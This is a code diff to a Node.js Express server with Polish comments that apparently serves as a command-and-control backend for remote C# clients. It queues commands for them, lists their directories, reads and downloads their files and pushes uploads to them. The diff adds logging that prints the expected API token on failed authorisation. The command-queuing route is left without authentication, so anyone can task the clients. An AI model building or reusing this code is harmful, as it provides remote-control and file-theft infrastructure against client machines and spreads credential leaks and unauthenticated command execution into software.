@@ -32,14 +32,16 @@ const fileTrees = {};
 const fileContents = {};
 
 app.use(cors());
-app.use(express.json());
+app.use(express.json({ limit: '50mb' })); // Zwiększ limit dla dużych plików
+app.use(express.urlencoded({ limit: '50mb', extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
 // Middleware autoryzujący tylko dla klienta (C#)
 function authMiddleware(req, res, next) {
   const token = req.headers['authorization'];
   if (token !== `Bearer ${API_TOKEN}`) {
-    return res.status(403).send('Forbidden – nieprawidłowy token');
+    console.log('Authorization failed. Expected:', `Bearer ${API_TOKEN}`, 'Got:', token);
+    return res.status(403).json({ success: false, message: 'Forbidden – nieprawidłowy token' });
   }
   next();
 }
@@ -80,6 +82,7 @@ app.post('/register', authMiddleware, (req, res) => {
   const { client } = req.body;
   if (!client) return res.status(400).send('Brakuje klienta');
   clients.add(client);
+  console.log(`✅ Klient zarejestrowany: ${client}`);
   res.sendStatus(200);
 });
 
@@ -90,6 +93,7 @@ app.get('/command', authMiddleware, (req, res) => {
   const cmd = commands[client];
   if (cmd) {
     delete commands[client];
+    console.log(`📤 Wysłano komendę do ${client}: ${cmd.substring(0, 100)}...`);
     return res.send(cmd);
   }
   res.status(204).send();
@@ -100,6 +104,7 @@ app.post('/result', authMiddleware, (req, res) => {
   const { client, result } = req.body;
   if (!client || !result) return res.status(400).send('Brakuje danych');
   results[client] = result;
+  console.log(`📥 Otrzymano wynik od ${client}: ${result.substring(0, 100)}...`);
   res.sendStatus(200);
 });
 
@@ -109,6 +114,7 @@ app.post('/command', (req, res) => {
   if (!client || !command) return res.status(400).send('Brakuje danych');
   if (!clients.has(client)) return res.status(404).send('Klient nieznany');
   commands[client] = command;
+  console.log(`📝 Zaplanowano komendę dla ${client}: ${command}`);
   res.sendStatus(200);
 });
 
@@ -121,6 +127,7 @@ app.post('/files', authMiddleware, (req, res) => {
 
   // Zapisujemy dane
   fileTrees[client] = { currentPath: path, files };
+  console.log(`📁 Otrzymano listę plików od ${client} dla ścieżki: ${path} (${files.length} elementów)`);
 
   res.sendStatus(200);
 });
@@ -135,6 +142,7 @@ app.post('/file', authMiddleware, (req, res) => {
     fileContents[client] = {};
   }
   fileContents[client][path] = content;
+  console.log(`📄 Otrzymano zawartość pliku od ${client}: ${path} (${content.length} znaków)`);
 
   res.sendStatus(200);
 });
@@ -157,8 +165,10 @@ app.get('/api/files', authMiddleware, (req, res) => {
   const path = req.query.path;
   const client = req.query.client;
   
-  if (!path || !client) return res.status(400).send('Brakuje parametrów');
-  if (!clients.has(client)) return res.status(404).send('Klient nieznany');
+  if (!path || !client) return res.status(400).json({ success: false, message: 'Brakuje parametrów' });
+  if (!clients.has(client)) return res.status(404).json({ success: false, message: 'Klient nieznany' });
+
+  console.log(`📂 Panel żąda listy plików od ${client}: ${path}`);
 
   // Wyślij komendę do klienta
   commands[client] = `listdir ${path}`;
@@ -169,10 +179,12 @@ app.get('/api/files', authMiddleware, (req, res) => {
       await new Promise(resolve => setTimeout(resolve, 500));
       const data = fileTrees[client];
       if (data && data.currentPath === path) {
+        console.log(`✅ Zwrócono listę plików dla ${client}: ${path}`);
         return res.json(data);
       }
     }
-    res.status(408).send('Timeout - brak odpowiedzi od klienta');
+    console.log(`⏰ Timeout dla listy plików ${client}: ${path}`);
+    res.status(408).json({ success: false, message: 'Timeout - brak odpowiedzi od klienta' });
   };
 
   checkForData();
@@ -183,8 +195,10 @@ app.get('/api/file', authMiddleware, (req, res) => {
   const path = req.query.path;
   const client = req.query.client;
   
-  if (!path || !client) return res.status(400).send('Brakuje parametrów');
-  if (!clients.has(client)) return res.status(404).send('Klient nieznany');
+  if (!path || !client) return res.status(400).json({ success: false, message: 'Brakuje parametrów' });
+  if (!clients.has(client)) return res.status(404).json({ success: false, message: 'Klient nieznany' });
+
+  console.log(`📖 Panel żąda zawartości pliku od ${client}: ${path}`);
 
   // Wyślij komendę do klienta
   commands[client] = `readfile ${path}`;
@@ -197,10 +211,12 @@ app.get('/api/file', authMiddleware, (req, res) => {
         const content = fileContents[client][path];
         // Usuń po pobraniu, aby nie zaśmiecać pamięci
         delete fileContents[client][path];
+        console.log(`✅ Zwrócono zawartość pliku dla ${client}: ${path}`);
         return res.json({ content });
       }
     }
-    res.status(408).send('Timeout - brak odpowiedzi od klienta');
+    console.log(`⏰ Timeout dla zawartości pliku ${client}: ${path}`);
+    res.status(408).json({ success: false, message: 'Timeout - brak odpowiedzi od klienta' });
   };
 
   checkForData();
@@ -211,8 +227,10 @@ app.get('/api/download', authMiddleware, (req, res) => {
   const path = req.query.path;
   const client = req.query.client;
   
-  if (!path || !client) return res.status(400).send('Brakuje parametrów');
-  if (!clients.has(client)) return res.status(404).send('Klient nieznany');
+  if (!path || !client) return res.status(400).json({ success: false, message: 'Brakuje parametrów' });
+  if (!clients.has(client)) return res.status(404).json({ success: false, message: 'Klient nieznany' });
+
+  console.log(`💾 Panel żąda pobrania pliku od ${client}: ${path}`);
 
   // Wyślij komendę do klienta
   commands[client] = `downloadfile ${path}`;
@@ -231,32 +249,62 @@ app.get('/api/download', authMiddleware, (req, res) => {
           const buffer = Buffer.from(base64Content, 'base64');
           const filename = path.split(/[\\/]/).pop();
           
+          console.log(`✅ Plik ${filename} gotowy do pobrania (${buffer.length} bytes)`);
+          
           res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
           res.setHeader('Content-Type', 'application/octet-stream');
           return res.send(buffer);
         } catch (e) {
-          return res.status(500).send('Błąd dekodowania pliku');
+          console.error(`❌ Błąd dekodowania pliku ${path}:`, e.message);
+          return res.status(500).json({ success: false, message: 'Błąd dekodowania pliku' });
         }
       }
     }
-    res.status(408).send('Timeout - brak odpowiedzi od klienta');
+    console.log(`⏰ Timeout dla pobierania pliku ${client}: ${path}`);
+    res.status(408).json({ success: false, message: 'Timeout - brak odpowiedzi od klienta' });
   };
 
   checkForData();
 });
 
-// Panel wysyła plik (upload)
+// Panel wysyła plik (upload) - POPRAWIONA WERSJA
 app.post('/api/upload', authMiddleware, (req, res) => {
+  console.log('📤 Upload request received');
+  console.log('Headers authorization:', req.headers['authorization'] ? 'Present' : 'Missing');
+  console.log('Body keys:', Object.keys(req.body));
+  
   const { client, path, content, filename } = req.body;
   
   if (!client || !path || !content || !filename) {
-    return res.status(400).send('Brakuje parametrów');
+    console.log('❌ Missing parameters:', { 
+      client: !!client, 
+      path: !!path, 
+      content: !!content, 
+      filename: !!filename 
+    });
+    return res.status(400).json({ 
+      success: false, 
+      message: 'Brakuje parametrów (client, path, content, filename)' 
+    });
   }
-  if (!clients.has(client)) return res.status(404).send('Klient nieznany');
+  
+  if (!clients.has(client)) {
+    console.log('❌ Unknown client:', client);
+    console.log('Available clients:', Array.from(clients));
+    return res.status(404).json({ 
+      success: false, 
+      message: `Klient nieznany: ${client}` 
+    });
+  }
 
+  console.log(`📤 Uploading file ${filename} to client ${client} at path ${path}`);
+  console.log(`Content size: ${content.length} characters`);
+  
   // Wyślij komendę do klienta z zawartością pliku (base64)
   const fullPath = path.endsWith('\\') ? path + filename : path + '\\' + filename;
   commands[client] = `uploadfile ${fullPath} ${content}`;
+  
+  console.log(`📝 Command sent to client: uploadfile ${fullPath} [${content.length} chars base64]`);
   
   // Czekaj na potwierdzenie
   const checkForResult = async () => {
@@ -264,20 +312,32 @@ app.post('/api/upload', authMiddleware, (req, res) => {
       await new Promise(resolve => setTimeout(resolve, 500));
       const result = results[client];
       if (result !== undefined) {
+        console.log(`📥 Received result from client ${client}:`, result);
         delete results[client];
         if (result.includes('SUCCESS')) {
+          console.log(`✅ Upload successful for ${filename}`);
           return res.json({ success: true, message: 'Plik został przesłany' });
         } else {
+          console.log(`❌ Upload failed for ${filename}:`, result);
           return res.status(400).json({ success: false, message: result });
         }
       }
     }
-    res.status(408).send('Timeout - brak odpowiedzi od klienta');
+    console.log(`⏰ Upload timeout for client ${client}, file ${filename}`);
+    res.status(408).json({ success: false, message: 'Timeout - brak odpowiedzi od klienta' });
   };
 
   checkForResult();
 });
 
+// Error handling middleware
+app.use((error, req, res, next) => {
+  console.error('❌ Server error:', error);
+  res.status(500).json({ success: false, message: 'Błąd serwera' });
+});
+
 app.listen(port, () => {
   console.log(`✅ Serwer działa na porcie ${port}`);
+  console.log(`🔑 API_TOKEN: ${API_TOKEN ? 'Skonfigurowany' : 'BRAK'}`);
+  console.log(`🔒 PANEL_PASSWORD: ${PANEL_PASSWORD ? 'Skonfigurowany' : 'BRAK'}`);
 });
